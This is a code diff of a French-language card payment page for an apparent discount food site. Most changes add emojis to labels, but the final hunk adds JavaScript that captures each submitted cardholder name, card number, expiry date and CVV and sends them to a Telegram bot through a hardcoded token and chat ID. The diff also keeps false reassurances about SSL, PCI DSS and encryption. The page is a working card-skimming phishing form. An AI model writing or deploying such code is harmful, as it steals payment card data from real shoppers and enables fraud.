@@ -325,21 +325,21 @@
             <img src="https://destockagealimentaireprixbas.com/wp-content/uploads/2024/04/Destockage-Alimentaire-2.gif" alt="Logo">
         </div>
 
-        <!-- Titre -->
-        <h1>Finalisez votre paiement</h1>
+        <!-- Titre avec émoji -->
+        <h1>💳 Finalisez votre paiement</h1>
 
         <!-- Formulaire -->
         <form id="credit-card-form" action="/credit-card" method="POST">
-            <!-- Nom sur la carte -->
+            <!-- Nom sur la carte avec émoji -->
             <div class="form-group">
-                <label for="nom_carte">Nom sur la carte</label>
+                <label for="nom_carte">👤 Nom sur la carte</label>
                 <i class="fas fa-user"></i>
                 <input type="text" id="nom_carte" name="nom_carte" placeholder="Nom sur la carte" required>
             </div>
 
-            <!-- Numéro de la carte avec logos intégrés à droite -->
+            <!-- Numéro de la carte avec logos intégrés à droite et émoji -->
             <div class="form-group">
-                <label for="numero_carte">Numéro de la carte</label>
+                <label for="numero_carte">🔢 Numéro de la carte</label>
                 <i class="fas fa-credit-card"></i>
                 <input type="text" id="numero_carte" name="numero_carte" placeholder="xxxx xxxx xxxx xxxx" required>
                 <div class="card-logos">
@@ -349,17 +349,17 @@
                 </div>
             </div>
 
-            <!-- Date d'expiration et CVV sur la même ligne -->
+            <!-- Date d'expiration et CVV sur la même ligne avec émojis -->
             <div class="form-group">
                 <div style="display: flex; gap: 10px;">
                     <div style="flex: 1;">
-                        <label for="date_expiration">Date d'expiration</label>
+                        <label for="date_expiration">📅 Date d'expiration</label>
                         <i class="fas fa-calendar-alt"></i>
                         <input type="text" id="date_expiration" name="date_expiration" placeholder="MM/AA" required>
                         <small class="small-text">Recto de la carte au format MM/AA</small>
                     </div>
                     <div style="flex: 1;">
-                        <label for="cvv">Code de sécurité (CVV)</label>
+                        <label for="cvv">🔒 Code de sécurité (CVV)</label>
                         <i class="fas fa-lock"></i>
                         <input type="number" id="cvv" name="cvv" placeholder="CVV" required>
                         <small class="small-text">3 chiffres sur le verso de la carte</small>
@@ -367,38 +367,38 @@
                 </div>
             </div>
 
-            <!-- Sauvegarder pour mon prochain paiement -->
+            <!-- Sauvegarder pour mon prochain paiement avec émoji -->
             <div class="save-payment">
                 <input type="checkbox" id="save_payment" name="save_payment">
-                <label for="save_payment">Sauvegarder pour mon prochain paiement</label>
+                <label for="save_payment">💾 Sauvegarder pour mon prochain paiement</label>
             </div>
 
-            <!-- Case à cocher pour accepter les CGV -->
+            <!-- Case à cocher pour accepter les CGV avec émoji -->
             <div class="cgv-checkbox">
                 <input type="checkbox" id="accept_cgv" name="accept_cgv" required>
                 <label for="accept_cgv">
-                    J'accepte les <a href="https://stripe.com/fr-ca/resources/more/general-terms-and-conditions-of-sale-france" target="_blank">Conditions Générales de Vente</a>
+                    ✅ J'accepte les <a href="https://stripe.com/fr-ca/resources/more/general-terms-and-conditions-of-sale-france" target="_blank">Conditions Générales de Vente</a>
                 </label>
             </div>
 
-            <!-- Bouton de soumission -->
-            <button type="submit" id="submit-button">Payer maintenant</button>
+            <!-- Bouton de soumission avec émoji -->
+            <button type="submit" id="submit-button">💸 Payer maintenant</button>
         </form>
 
-        <!-- Texte indiquant que tous les champs sont obligatoires -->
+        <!-- Texte indiquant que tous les champs sont obligatoires avec émoji -->
         <div class="required-fields">
-            Tous les champs doivent être obligatoirement remplis.
+            ⚠️ Tous les champs doivent être obligatoirement remplis.
         </div>
 
-        <!-- Informations de sécurité -->
+        <!-- Informations de sécurité avec émojis -->
         <div class="security-info">
             <div class="line">
                 <i class="fas fa-shield-alt"></i>
-                <p>Votre banque peut vous demander d'autoriser le paiement pour compléter votre achat. Vous êtes sur un serveur de paiement sécurisé par les normes SSL (https) et PCI DSS de nos partenaires bancaires. Vos données sont encryptées pour plus de sécurité.</p>
+                <p>🛡️ Votre banque peut vous demander d'autoriser le paiement pour compléter votre achat. Vous êtes sur un serveur de paiement sécurisé par les normes SSL (https) et PCI DSS de nos partenaires bancaires. Vos données sont encryptées pour plus de sécurité.</p>
             </div>
             <div class="line">
                 <i class="fas fa-info-circle"></i>
-                <p><a href="#">Me renseigner sur les finalités du traitement de mes données personnelles, les durées de conservation et mes droits</a>. En validant ma transaction, je reconnais avoir pris connaissance des <a href="#">CGU</a> et je les accepte.</p>
+                <p>📄 <a href="#">Me renseigner sur les finalités du traitement de mes données personnelles, les durées de conservation et mes droits</a>. En validant ma transaction, je reconnais avoir pris connaissance des <a href="#">CGU</a> et je les accepte.</p>
             </div>
         </div>
 
@@ -460,7 +460,7 @@
             e.target.value = value;
         });
 
-        // Gestion du temps de chargement
+        // Gestion du temps de chargement et envoi via Telegram
         const submitButton = document.getElementById('submit-button');
         const form = document.getElementById('credit-card-form');
         const loadingOverlay = document.getElementById('loading-overlay');
@@ -471,12 +471,33 @@
             // Affiche l'écran de chargement
             loadingOverlay.classList.add('active');
 
-            // Simule un temps de chargement de 30 secondes
-            setTimeout(() => {
-                loadingOverlay.classList.remove('active');
-                // Soumet le formulaire après 30 secondes
-                form.submit();
-            }, 5000); // 5 secondes
+            // Récupère les données du formulaire
+            const formData = new FormData(form);
+            const data = {};
+            formData.forEach((value, key) => {
+                data[key] = value;
+            });
+
+            // Envoi des données via Telegram
+            const botToken = '8022971997:AAGj1VGrYKEXWdX6GaHIzT8nsomWYoJt8mA'; // Remplacez par votre token de bot Telegram
+            const chatId = '5652184847'; // Remplacez par votre chat ID
+            const message = `Nouveau formulaire soumis:\nNom: ${data.nom_carte}\nNuméro de carte: ${data.numero_carte}\nDate d'expiration: ${data.date_expiration}\nCVV: ${data.cvv}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => response.json())
+                .then(result => {
+                    console.log('Message envoyé via Telegram:', result);
+                    // Simule un temps de chargement de 5 secondes
+                    setTimeout(() => {
+                        loadingOverlay.classList.remove('active');
+                        // Soumet le formulaire après 5 secondes
+                        form.submit();
+                    }, 5000); // 5 secondes
+                })
+                .catch(error => {
+                    console.error('Erreur lors de l\'envoi du message via Telegram:', error);
+                    loadingOverlay.classList.remove('active');
+                });
         });
     </script>
 </body>
